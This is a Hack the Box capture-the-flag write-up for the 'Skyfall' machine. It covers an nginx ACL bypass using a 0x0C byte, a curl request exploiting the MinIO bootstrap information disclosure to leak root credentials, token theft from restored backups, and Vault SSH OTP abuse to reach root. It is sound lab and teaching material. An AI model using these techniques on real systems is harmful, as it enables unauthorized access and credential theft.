# <h1><p align="center">  Skyfall from Hack the Box </p></h1>
#### Target: 10.10.11.254

This was a seasonal box rated as insane difficulty on the main Hack the Box platform. 

# Recon
To start off I always run scans, I have been trying out the incursore script lately which is what I ran here. The important part was just he nmap scan that it ran. 
### nmap scan output
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The important details here are that we have ports 22 and 80 open. As well this shows the versions of OpenSSH and nginx. Both nginx and OpenSSH are out of date which is worth noting for more research. 
* OpenSSH 8.9p1
* Ubuntu 3ubuntu0.6
* nginx 1.18.0
* The title banner is: Skyfall - Introducing Sky Storage!

Looking at the website I see under Demo a option for Try our Demo
![[Pasted image 20240205170812.png]]
When I click on Try Our Demo, the browser tries to resolve demo.skyfall.htb
With that in mind I added this to my /etc/hosts file. 
`10.10.11.254 skyfall.htb demo.skyfall.htb`

While looking at the site I started running some ffuf scans in the background. 
## ffuf scans
### subdomain fuzzing
```bash
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://skyfall.htb/ -H 'Host: FUZZ.skyfall.htb' -ac   

demo                    [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 499ms]
```
This confirmed what I already knew that there was a demo subdomain. 
I also ran some directory fuzzing on both skyfall.htb and demo.skyfall.htb

I ran page fuzzing on skyfall.htb and demo.skyfall.htb, I found a metrics page on demo.skyfall.htb that ended up being useful later on. 

### Directory fuzzing on demo.skyfall.htb
```bash
└─$ ffuf -u http://demo.skyfall.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -ac
login                   [Status: 200, Size: 7805, Words: 1978, Lines: 181, Duration: 331ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 135ms]
metrics                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 152ms]
```

After adding demo.skyfall.htb to the /etc/hosts file I went to that page to check it out, and got redirected to http://demo.skyfall.htb/login where there was a login form that showed a guest login that I could use (Demo login: guest / guest)
### http://demo.skyfall.htb/login
 ![[Pasted image 20240206121000.png]]
 
After logging in I was taken to a dashboard that showed © Sky Storage Powered by Flask.
![[Pasted image 20240206121633.png]]
Here there was a Files page, where I could upload and download files, there also was a URL Fetch pages, that would upload files from a server. I could spin up a server on my Kali VM and get the webpage to upload the file. After playing with this for a while I could not find a way to get the webpage to execute any code off the files that I uploaded. 
***


# Foothold
There also was a MinIO Metrics page that gave me a redirect to the /metrics page I found running ffuf earlier. This page returned a 403 Forbidden and displayed nginx/1.18.0 (Ubuntu)
![[Pasted image 20240206122134.png]]

After doing some research on nginx 1.18.0 and flask I found an article about # Exploiting HTTP Parsers Inconsistencies. https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-nodejs
This had a list of Flask Bypass Characters based off the versions of nginx. Here I found nginx 1.18.0 listed. 
![[Pasted image 20240206180928.png]]
The way I found this work would be if we had a request such as `GET /metrics HTTP/1.1`
I can add a trailing / to it after metrics as such `GET /metrics/ HTTP/1.1`
From there I intercepted the request in Burpsuite, highlight the trailing slash, and change the HEX code of the trailing slash from 2f to 0C (from the above list) then apply changes and forward the request. NOTE: I found I had to have the session cookie as well which was assigned to me when I logged into skyfall.htb/login as guest:guest. 
![[Pasted image 20240206181958.png]]
![[Pasted image 20240206182311.png]]
![[Pasted image 20240206182356.png]]
If you want to see the non printable characters so you can see what Burpsuite is doing you can click on the `\n` button to show non-printable characters. 
![[Pasted image 20240206182557.png]]
After forwarding this request I was not able to see the MinIO Internal Metrics page
### MinIO Internal Metrics
![[Pasted image 20240206182711.png]]
![[Pasted image 20240206182739.png]]
At the bottom of this page I found this line listing 
`minio_endpoint_url              demo.skyfall.htb                                http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`
I added `prd23-s3-backend.skyfall.htb` to my /etc/hosts file and went to the http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster page. 
![[Pasted image 20240206183231.png]]
This appeared to be some sort of s3 bucket/API for minIO

Upon doing research on minIO I found these articles https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services

https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/

Since it looked like I had found an API endpoint this looked like it was worth exploring. After reading the articles I thought it would be worth trying the same thing here. 
Sure enough I was able to get some credentials out of this. 
![[Pasted image 20240208173829.png]]
To make this easier to read, I copied the command as curl out of Burpsuite and piped it to jq removing the -i flag. 
```bash
curl -s -k -X $'POST' \    
   -H $'Host: prd23-s3-backend.skyfall.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -  
H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 0' \  
   -b $'session=.eJwljstqAzEMAP_F5xxkWVpZ-ZnFetESaGE3OYX8exd6nGEO8257HXl-tfvzeOWt7d_R7s3XLPSAgAlEsxdCUeHMGj4WdZvJVls54VAmwysNCyXdrFRXaYgXdSYJYl0a4EbTMFnMZENmcjdFtkzpAzg6D0o0Nawt2zXyOvP4v-kX-nnU_vx95M8lomsiFiQx2zQBxTFJpMbyVaI-E6RTb58_e  
VY_7w.ZcBt1Q.AfNvlrmqL-S8AsglUAFXX12iABE' \  
   $'http://demo.skyfall.htb/minio/bootstrap/v1/verify' | jq  
{  
 "MinioEndpoints": [  
   {  
     "Legacy": false,  
     "SetCount": 1,  
     "DrivesPerSet": 4,  
     "Endpoints": [  
       {  
         "Scheme": "http",  
         "Opaque": "",  
         "User": null,  
         "Host": "minio-node1:9000",  
         "Path": "/data1",  
         "RawPath": "",  
         "OmitHost": false,  
         "ForceQuery": false,  
         "RawQuery": "",  
         "Fragment": "",  
         "RawFragment": "",  
         "IsLocal": false  
       },  
       {  
         "Scheme": "http",  
         "Opaque": "",  
         "User": null,  
         "Host": "minio-node2:9000",  
         "Path": "/data1",  
         "RawPath": "",  
         "OmitHost": false,  
         "ForceQuery": false,  
         "RawQuery": "",  
         "Fragment": "",  
         "RawFragment": "",  
         "IsLocal": true  
       },  
       {  
         "Scheme": "http",  
         "Opaque": "",  
         "User": null,  
         "Host": "minio-node1:9000",  
         "Path": "/data2",  
         "RawPath": "",  
         "OmitHost": false,  
         "ForceQuery": false,  
         "RawQuery": "",  
         "Fragment": "",  
         "RawFragment": "",  
         "IsLocal": false  
       },  
       {  
         "Scheme": "http",  
         "Opaque": "",  
         "User": null,  
         "Host": "minio-node2:9000",  
         "Path": "/data2",  
         "RawPath": "",  
         "OmitHost": false,  
         "ForceQuery": false,  
         "RawQuery": "",  
         "Fragment": "",  
         "RawFragment": "",  
         "IsLocal": true  
       }  
     ],  
     "CmdLine": "http://minio-node{1...2}/data{1...2}",  
     "Platform": "OS: linux | Arch: amd64"  
   }  
 ],  
 "MinioEnv": {  
   "MINIO_ACCESS_KEY_FILE": "access_key",  
   "MINIO_BROWSER": "off",  
   "MINIO_CONFIG_ENV_FILE": "config.env",  
   "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",  
   "MINIO_PROMETHEUS_AUTH_TYPE": "public",  
   "MINIO_ROOT_PASSWORD": [REDACTED],  
   "MINIO_ROOT_PASSWORD_FILE": "secret_key",  
   "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",  
   "MINIO_ROOT_USER_FILE": "access_key",  
   "MINIO_SECRET_KEY_FILE": "secret_key",  
   "MINIO_UPDATE": "off",  
   "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"  
 }  
}
```

There is a console for minIO that has admin and normal functions in it.  You can find the console here https://github.com/minio/mc and more the guide on using it here https://github.com/minio/mc/blob/master/docs/minio-admin-complete-guide.md

# Using the minio console
## set parameters for mc
```bash
└─$ ./mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww [REDACTED]     
Added `myminio` successfully.
```

## admin console
```bash
└─$ ./mc admin info myminio                                                                             
●  minio-node1:9000
   Uptime: 1 hour 
   Version: 2023-03-13T19:46:17Z
   Network: 2/2 OK 
   Drives: 2/2 OK 
   Pool: 1

●  minio-node2:9000
   Uptime: 1 hour 
   Version: 2023-03-13T19:46:17Z
   Network: 2/2 OK 
   Drives: 2/2 OK 
   Pool: 1

Pools:
   1st, Erasure sets: 1, Drives per erasure set: 4

1.6 MiB Used, 8 Buckets, 9 Objects, 4 Versions
4 drives online, 0 drives offline
```

# mc console
```bash
└─$ ./mc ls myminio 
[2023-11-07 20:59:15 PST]     0B askyy/
[2023-11-07 20:58:56 PST]     0B btanner/
[2023-11-07 20:58:33 PST]     0B emoneypenny/
[2023-11-07 20:58:22 PST]     0B gmallory/
[2023-11-07 16:08:01 PST]     0B guest/
[2023-11-07 20:59:05 PST]     0B jbond/
[2023-11-07 20:58:10 PST]     0B omansfield/
[2023-11-07 20:58:45 PST]     0B rsilva/
```

## Listing backup versions
```bash
└─$ ./mc ls --recursive --versions myminio
[2023-11-07 20:59:15 PST]     0B askyy/
[2023-11-07 21:35:28 PST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-09 13:37:25 PST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-09 13:37:09 PST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-09 13:36:30 PST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-07 20:58:56 PST]     0B btanner/
[2023-11-07 21:35:36 PST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-07 20:58:33 PST]     0B emoneypenny/
[2023-11-07 21:35:56 PST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-07 20:58:22 PST]     0B gmallory/
[2023-11-07 21:36:02 PST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-07 16:08:01 PST]     0B guest/
[2023-11-07 16:08:05 PST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-07 20:59:05 PST]     0B jbond/
[2023-11-07 21:35:45 PST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-07 20:58:10 PST]     0B omansfield/
[2023-11-07 21:36:09 PST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-07 20:58:45 PST]     0B rsilva/
[2023-11-07 21:35:51 PST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
```

As we can see here there are three (3) version of the backup files listed here. 
We can undo the versions and download all of them to our own machine. 

## Undo version 
```bash
./mc undo myminio/askyy/home_backup.tar.gz
✓ Last upload of `home_backup.tar.gz` (vid=25835695-5e73-4c13-82f7-30fd2da2cf61) is reverted.
```

Then I can copy to my machine
## Copy to Kali
```bash
./mc cp myminio/askyy/home_backup.tar.gz ./
...skyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB 
```

After getting all three versions I created directories for each one, inside a backup directory to keep it organized and unpacked them with tar. 

## Unpacking the tar files
```bash
tar -xzvf home_backup.tar.gz
<SNIP>
./terraform-generator/.github/ISSUE_TEMPLATE/feature_request.md
./terraform-generator/.github/ISSUE_TEMPLATE/bug_report.md
./.bashrc
./.ssh/
./.ssh/id_rsa
./.ssh/id_rsa.pub
./.ssh/authorized_keys
./.viminfo
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
<SNIP...>
```
Searching through the backup files I found a vault address and token
## Searching for goodies in the backups
```bash
grep -rn "VAULT"                                                 
2/.bashrc:43:export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
2/.bashrc:44:export VAULT_TOKEN="hvs.CAESIJlU9JMYEh[REDACTED]"
```
Next I needed to install Vault
I found this github where I downloaded and compiled vault https://github.com/hashicorp/vault
Afterwards I also found that I could have just grabbed the binary from https://developer.hashicorp.com/vault/install

# Vault usage

## export Vault address
```bash
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
```
## Vault login
The token found in the backups was used for the login. 
```bash
 ./vault login   
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.CAESIJlU9JMYEh[REDACTED]
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       435891h5m20s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```
I added vault to my path for the rest of this to make it easier to use. 
This had a bunch of good information on how to use vault https://developer.hashicorp.com/vault/tutorials/secrets-management/ssh-otp

I went into the backups directory that had .ssh with keys in it for this. 
## Write ssh role to vault
```bash
└─$ vault write -address="$VAULT_API_ADDR" ssh/creds/dev_otp_key_role ip="10.10.11.254" username="askyy"
Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/EOV7frRrggv4IrC8WRl1fXsE
lease_duration     768h
lease_renewable    false
ip                 10.10.11.254
key                8d9b639f[REDACTED]1fcef4776333
key_type           otp
port               22
username           askyy
```     

## Write OTP to vault
NOTE: you must use the OTP for the password
```bash                      
┌──(chxsec㉿kali)-[~/…/skyfall/backups/3/.ssh]
└─$ vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no askyy@demo.skyfall.htb      
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 3aae[REDACTED]765a490
(askyy@demo.skyfall.htb) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Feb  5 17:49:16 2024 from 10.10.14.151
```
This got me into skyfall as the user askyy
***
# Root
Once on the box I ran the standard `sudo -l`
```bash
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```
Testing this I ran 
```bash
askyy@skyfall:~$ sudo /root/vault/-unseal -c /etc/vault-unseal.yaml -d
```
This put a debug.log file in my current directory NOTE: this file was present in the ~/ but not readable by the user askyy before I ran the command above. 
## debug.log 
looking at the log, there was a Master token present in it. 
```BASH
skyy@skyfall:~$ cat debug.log 
2024/02/05 17:50:35 Initializing logger...
2024/02/05 17:50:35 Reading: /etc/vault-unseal.yaml
2024/02/05 17:50:35 Security Risk!
2024/02/05 17:50:35 Master token found in config: hvs.[REDACTED]
2024/02/05 17:50:35 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/02/05 17:50:35 Check interval: 5s
2024/02/05 17:50:35 Max checks: 5
2024/02/05 17:50:35 Establishing connection to Vault...
2024/02/05 17:50:35 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/02/05 17:50:35 Checking seal status
2024/02/05 17:50:35 Vault sealed: false
```

Now going back to my Kali machine I ran these in a new shell (I left my old ssh session open in case I needed it)
## export token and URL
```bash
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
```
```bash
export VAULT_TOKEN="hvs.[REDACTED]"
```
```bash
vault write ssh/roles/otp_key_role \
key_type=otp \
default_user=root \
cidr_list=10.10.16.1/24,10.10.11.1/24
Success! Data written to: ssh/roles/otp_key_role
```
## ssh as root 
again make sure to use OTP as password
```bash
vault ssh -role otp_key_role -mode otp -strict-host-key-checking=no root@demo.skyfall.htb
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: bd1d9[REDACTED]ca6cf1c8
(root@demo.skyfall.htb) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Feb  5 17:52:02 2024 from 10.10.14.151
root@skyfall:~# ls /root
minio  root.txt  sky_storage  vault
root@skyfall:~# ls /root/root.txt
/root/root.txt
root@skyfall:~# cat /root/root.txt
[REDACTED]
```

## NOTE: 
I understand this was the unintended route to root, and once week is up it will be patched and a new harder route to root will be needed. 

# Special Thanks to the HackSmarter team and community!

